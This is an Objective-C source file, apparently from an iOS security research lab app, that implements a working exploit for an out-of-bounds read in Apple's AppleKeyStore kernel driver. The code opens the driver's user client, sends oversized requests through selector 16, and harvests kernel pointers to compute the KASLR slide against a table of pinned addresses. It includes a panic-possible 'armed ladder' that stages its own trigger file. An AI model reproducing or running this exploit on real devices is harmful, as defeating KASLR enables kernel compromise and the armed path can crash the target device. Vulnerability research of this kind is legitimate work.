//
//  P182AKSKaslrOob.m — CVE-2026-65343: the AppleKeyStore ACM deserialize
//  OOB read -> KASLR. Byte-proven LIVE on 23F77/26.5 (findings 2026-11-24:
//  the 26.6.1 fix's `remaining >=` assert family exists on 26.7.1 and is
//  ABSENT on 26.5; the deserialize bodies are otherwise code-identical).
//
//  v2 (2026-11-24, the v1 + P057 receipts): the DYLD_INTERPOSE capture is
//  DEAD on modern dyld — Security.framework lives in the shared cache and
//  its IOConnectCallMethod is a cache-internal branch the interposer never
//  binds (hook self-test receipt, hook_n=0, twice). But the door does not
//  need it: P104/P057/P161 proved OUR OWN user client works —
//    IOServiceOpen(AppleKeyStore, type 0/1)  -> kr=0, ungated
//    sel 16 (the megafunction feeder, jumptable @ 0xfffffff008d9f868
//    -> FUN_8d8ca10 -> prepare_output_ool 0x8d88a68) -> kr=0, ZERO handle
//    accepted, outsz=1024 answered
//  So v2 feeds sel 16 directly:
//    [safe]   declared 0x28 / 0x100  (the P057 parity receipts — zeros out)
//    [armed]  declared 0x180 / 0x200 / 0x400 / 0x800 — the PoC's OOB shape.
//             PANIC-POSSIBLE: the copyout reads past the kernel ACM message
//             buffer (ByteVort3x's 163-sel 0x800 sweep crashed); ONE TAP PER
//             FRESH BOOT, gated by Documents/p182_arm.txt (any content,
//             CONSUMED on read — rewrite it to re-arm after a force-quit).
//  Every output is scanned for kernel-band qwords -> the kptr list + the
//  slide consensus against the 23F77 static pin table.
//
//  HONESTY: a KASLR leak is NOT hasKread (the gate stays
//  kread32(kbase)==0xfeedfacf via board commitSlide). Read-only copyout OOB
//  (the safe dial is PANIC-FREE; the armed ladder is panic-possible).
//  Log p182_aks_kaslr_log.txt.
//

#import "P182AKSKaslrOob.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007Board.h"

#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <string.h>
#import <unistd.h>

#define P182_BUILD @"p182-aks-kaslr-oob-v3-selfstage"

/* ── IOKit (dlsym'd — the house pattern; iOS apps do not link IOKit) ── */
typedef mach_port_t io_obj_t;
typedef void *(*p182_matching_t)(const char *);
typedef io_obj_t (*p182_getsvc_t)(mach_port_t, void *);
typedef kern_return_t (*p182_open_t)(io_obj_t, mach_port_t, uint32_t, io_obj_t *);
typedef kern_return_t (*p182_close_t)(io_obj_t);
typedef kern_return_t (*p182_method_t)(
    io_obj_t, uint32_t,
    const uint64_t *, uint32_t,
    const void *, size_t,
    uint64_t *, uint32_t *,
    void *, size_t *);

/* ── kernel-band classifier (23F77 + T8150 bands) ── */
static int p182_is_kptr(uint64_t v) {
    if (!v) return 0;
    if ((v >> 36) == 0xfffffff0ULL) return 1;
    if ((v >> 32) == 0xfffffe00ULL) return 1;
    if (v >= 0xfffffe0000000000ULL && v < 0xfffffff100000000ULL) return 1;
    return 0;
}

/* the 23F77 static pin table (slide candidates — every static in the whole
   kernelcache shares ONE slide; a leaked vtable/static pointer = pin+slide) */
static const struct { uint64_t va; const char *nm; } p182_pins[] = {
    { 0xfffffff007004000ULL, "kernel static_base (link base)" },
    { 0xfffffff00ae6a790ULL, "STATIC_RIPCBINFO (23F77 data pin)" },
    { 0xfffffff00a60d8d0ULL, "pmap_load_trust_cache (23F77 text pin)" },
    { 0xfffffff008b673f8ULL, "AMFI UC (23F77 text pin)" },
};

/* one feeder call: struct_in = {handle[16]=0, cmd_type u32, cmd_size u32,
   declared_length u32 @ +24} — the P057-proven 0x28 shape. */
static int p182_feed(p182_method_t method, io_obj_t conn, int nsc,
                     uint32_t declared, uint8_t *out, size_t *outsz,
                     uint64_t *scalo, uint32_t *scaln) {
    uint8_t msg[0x28];
    memset(msg, 0, sizeof msg);
    memcpy(msg + 24, &declared, 4);
    uint64_t sc[1] = {0};
    return method(conn, 16,
                 nsc ? sc : NULL, (uint32_t)(nsc ? 1 : 0),
                 msg, sizeof msg,
                 scalo, scaln, out, outsz);
}

@implementation P182AKSKaslrOob

+ (NSString *)tap {
    NSMutableString *log = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    int fd = open([[docs stringByAppendingPathComponent:
                    @"p182_aks_kaslr_log.txt"] UTF8String],
                  O_CREAT | O_WRONLY | O_TRUNC, 0644);
    void (^L)(NSString *) = ^(NSString *s) {
        NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
        [log appendString:out];
        if (fd >= 0) { const char *p = out.UTF8String; if (p) write(fd, p, strlen(p)); }
    };

    L([NSString stringWithFormat:@"=== p182 session %@ BUILD %@ ===",
       LabLocalMilitaryNow() ?: @"?", P182_BUILD]);
    L(@"CVE-2026-65343 -- the AKS ACM deserialize OOB read -> KASLR, v2:");
    L(@"the OWN-user-client feeder (P104/P057/P161-proven: type 0/1 ungated,");
    L(@"sel 16 answers with a ZERO handle). The interpose route is DEAD on");
    L(@"modern dyld (cache-internal calls, hook_n=0 twice) -- dropped in v2.");
    L(@"Safe dial PANIC-FREE; the armed ladder (p182_arm.txt, consumed)");
    L(@"is PANIC-POSSIBLE -- ONE TAP PER FRESH BOOT.");
    L(@"A KASLR leak is NOT hasKread; the gate stays kread32(kbase).");
    L([LabDeviceProfile identBlock] ?: @"ident=?");

    void *h = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!h) h = RTLD_DEFAULT;
    p182_matching_t matching = (p182_matching_t)dlsym(h, "IOServiceMatching");
    p182_getsvc_t getsvc = (p182_getsvc_t)dlsym(h, "IOServiceGetMatchingService");
    p182_open_t opener = (p182_open_t)dlsym(h, "IOServiceOpen");
    p182_close_t closer = (p182_close_t)dlsym(h, "IOServiceClose");
    p182_method_t method = (p182_method_t)dlsym(h, "IOConnectCallMethod");
    if (!matching || !getsvc || !opener || !method) {
        L(@"[-] IOKit symbols unresolved -- tap void");
        if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
        return log;
    }

    /* ── 1: our own UC (the P161 receipt: type 0..32 all open) ── */
    L(@"");
    L(@"=== 1: open our own AppleKeyStore user client ===");
    void *m = matching("AppleKeyStore");
    io_obj_t svc = getsvc(0, m);
    if (!svc) {
        L(@"[-] AppleKeyStore lookup DENIED -- honest row");
        if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
        return log;
    }
    io_obj_t conn = 0;
    kern_return_t kr = opener(svc, mach_task_self(), 0, &conn);
    if (kr != KERN_SUCCESS || !conn) {
        L([NSString stringWithFormat:@"[-] type 0 open kr=0x%x -- trying type 1", kr]);
        kr = opener(svc, mach_task_self(), 1, &conn);
    }
    if (kr != KERN_SUCCESS || !conn) {
        L([NSString stringWithFormat:@"[-] open failed kr=0x%x -- tap void", kr]);
        if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
        return log;
    }
    L([NSString stringWithFormat:@"[1] own UC open conn=0x%x (zero-handle feeder)",
       (unsigned)conn]);

    /* ── 2: the safe dial (P057 parity: kr=0, zeros, outsz=1024) ── */
    L(@"");
    L(@"=== 2: the safe dial (declared 0x28/0x100 — PANIC-FREE) ===");
    static uint8_t out[0x4000];
    uint64_t kptrs[256];
    int kptrN = 0;
    const uint32_t safeDial[] = { 0x28, 0x100 };
    for (int nsc = 0; nsc <= 1; nsc++) {
        for (size_t di = 0; di < sizeof(safeDial)/sizeof(safeDial[0]); di++) {
            memset(out, 0xBB, sizeof out);
            size_t outsz = 1024;                    /* the P057 receipt size */
            uint64_t scalo[8] = {0};
            uint32_t scaln = 8;
            kern_return_t k = p182_feed(method, conn, nsc, safeDial[di],
                                        out, &outsz, scalo, &scaln);
            int nonfill = 0, kn = 0;
            uint64_t firstK = 0;
            for (size_t i = 0; i + 8 <= outsz; i += 8) {
                uint64_t v = 0;
                memcpy(&v, out + i, 8);
                if (v != 0xBBBBBBBBBBBBBBBBULL) nonfill++;
                if (p182_is_kptr(v)) {
                    kn++;
                    if (!firstK) firstK = v;
                    if (kptrN < 256) {
                        int dup = 0;
                        for (int q = 0; q < kptrN; q++) if (kptrs[q] == v) { dup = 1; break; }
                        if (!dup) kptrs[kptrN++] = v;
                    }
                }
            }
            L([NSString stringWithFormat:
               @"[2] sel=16 nsc=%d decl=0x%x kr=0x%08x outsz=%#zx nonfill=%d "
               @"kptr=%d%@", nsc, safeDial[di], (unsigned)k, outsz, nonfill, kn,
               firstK ? [NSString stringWithFormat:@" first=0x%016llx",
                          (unsigned long long)firstK] : @""]);
            if (nonfill > 0 && kn == 0) {
                /* show the first 32 nonfill bytes so the shape is visible */
                NSMutableString *hx = [NSMutableString string];
                int shown = 0;
                for (size_t i = 0; i < outsz && shown < 32; i++) {
                    if (out[i] != 0xBB) {
                        [hx appendFormat:@"%02x", out[i]];
                        shown++;
                    }
                }
                L([NSString stringWithFormat:@"[2]   content: %@", hx]);
            }
        }
    }

    /* SELF-STAGING (2026-11-28 law): the safe dial answered clean, so this
       probe writes ITS OWN arm file. The deliberate act stays -- a fresh
       force-quit plus ONE re-tap is the confirmation; the file-creation
       friction goes. Manual arming still works (any content). */
    {
        NSString *stagePath = [docs stringByAppendingPathComponent:@"p182_arm.txt"];
        NSString *stage = [NSString stringWithFormat:
            @"staged by p182 after the safe dial OK %@ -- one armed tap per fresh boot\n",
            LabLocalMilitaryNow() ?: @"?"];
        [stage writeToFile:stagePath atomically:YES
                  encoding:NSUTF8StringEncoding error:NULL];
        L(@"[2] SELF-STAGED: p182_arm.txt written -- force-quit, then ONE armed tap.");
    }

    /* ── 3: the ARMORY gate ── */
    L(@"");
    L(@"=== 3: the armed ladder (Documents/p182_arm.txt — consumed) ===");
    NSString *armPath = [docs stringByAppendingPathComponent:@"p182_arm.txt"];
    int armed = 0;
    {
        int afd = open([armPath UTF8String], O_RDONLY);
        if (afd >= 0) {
            char buf[64];
            ssize_t n = read(afd, buf, sizeof buf - 1);
            close(afd);
            if (n > 0) armed = 1;
            unlink([armPath UTF8String]);            /* CONSUMED — one armed tap per write */
            L(@"[3] ARM FILE PRESENT — the armed ladder runs (PANIC-POSSIBLE:");
            L(@"    the copyout reads past the ACM buffer; fresh-boot law).");
        } else {
            L(@"[3] no arm file — the armed ladder HOLDS. It SELF-STAGES after "
              @"a clean safe dial (or write ANY content to:)");
            L([NSString stringWithFormat:@"    %@", armPath]);
            L(@"    then force-quit and tap once more.");
        }
    }

    int ladderHits = 0;
    if (armed) {
        const uint32_t ladder[] = { 0x180, 0x200, 0x400, 0x800 };
        for (size_t li = 0; li < sizeof(ladder)/sizeof(ladder[0]); li++) {
            memset(out, 0xBB, sizeof out);
            size_t outsz = 0x1000;                   /* the OOB read target size */
            uint64_t scalo[8] = {0};
            uint32_t scaln = 8;
            kern_return_t k = p182_feed(method, conn, 0, ladder[li],
                                        out, &outsz, scalo, &scaln);
            int nonfill = 0, kn = 0;
            uint64_t firstK = 0;
            for (size_t i = 0; i + 8 <= outsz; i += 8) {
                uint64_t v = 0;
                memcpy(&v, out + i, 8);
                if (v != 0xBBBBBBBBBBBBBBBBULL) nonfill++;
                if (p182_is_kptr(v)) {
                    kn++;
                    if (!firstK) firstK = v;
                    if (kptrN < 256) {
                        int dup = 0;
                        for (int q = 0; q < kptrN; q++) if (kptrs[q] == v) { dup = 1; break; }
                        if (!dup) kptrs[kptrN++] = v;
                    }
                }
            }
            L([NSString stringWithFormat:
               @"[3] sel=16 decl=0x%x kr=0x%08x outsz=%#zx nonfill=%d kptr=%d%@",
               ladder[li], (unsigned)k, outsz, nonfill, kn,
               firstK ? [NSString stringWithFormat:@" first=0x%016llx -- OOB LANDS",
                          (unsigned long long)firstK] : @""]);
            if (kn > 0) ladderHits++;
        }
    }

    /* ── 4: the kptr list + slide consensus ── */
    L(@"");
    L(@"=== 4: the kptr list + the slide consensus ===");
    for (int i = 0; i < kptrN && i < 32; i++)
        L([NSString stringWithFormat:@"[4] kptr[%d] = 0x%016llx", i,
           (unsigned long long)kptrs[i]]);
    if (kptrN > 32)
        L([NSString stringWithFormat:@"[4] %d more in the kptr table", kptrN - 32]);

    uint64_t voteDelta[64]; int votes[64]; int voteN = 0;
    for (int i = 0; i < kptrN; i++) {
        for (size_t p = 0; p < sizeof(p182_pins)/sizeof(p182_pins[0]); p++) {
            uint64_t d = kptrs[i] - p182_pins[p].va;
            if (d == 0 || (d & 0x3fff)) continue;
            if (d > 0x80000000ULL) continue;
            int found = -1;
            for (int v = 0; v < voteN; v++) if (voteDelta[v] == d) { found = v; break; }
            if (found < 0 && voteN < 64) { voteDelta[voteN] = d; votes[voteN] = 1; voteN++; }
            else if (found >= 0) votes[found]++;
        }
    }
    int best = -1;
    for (int v = 0; v < voteN; v++) if (best < 0 || votes[v] > votes[best]) best = v;
    NSString *slideStr = @"none";
    if (best >= 0 && votes[best] >= 2) {
        slideStr = [NSString stringWithFormat:@"0x%llx (candidate)",
                    (unsigned long long)voteDelta[best]];
        L([NSString stringWithFormat:
           @"[4] *** SLIDE CONSENSUS: 0x%llx (%d votes) -- kbase = 0x%llx ***",
           (unsigned long long)voteDelta[best], votes[best],
           (unsigned long long)(0xfffffff007004000ULL + voteDelta[best])]);
        L(@"[4] a CONSENSUS slide is a candidate, NOT hasKread.");
    } else if (kptrN > 0) {
        L(@"[4] no consensus this tap -- the kptr list above is the artifact;");
        L(@"    offline match it against the 23F77 Ghidra program.");
    }

    closer(conn);

    L(@"");
    L(@"=== VERDICT ===");
    L([NSString stringWithFormat:
       @"[p182] own-UC feeder ok; kptrs=%d; ladder=%@; slide=%@",
       kptrN, armed ? @"ARMED (ran)" : @"held", slideStr]);
    L(@"[=] Read-only OOB receipt class. hasKread stays NO -- it flips ONLY");
    L(@"    on kread32(kbase) via commitSlide.");

    [[P007Board shared] recordEvent:@"p182_aks_kaslr"
                                 kind:@"kaslr"
                               detail:[NSString stringWithFormat:
                                       @"kptrs=%d armed=%d", kptrN, armed]
                               source:@"p182"];
    if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
    return log;
}

@end
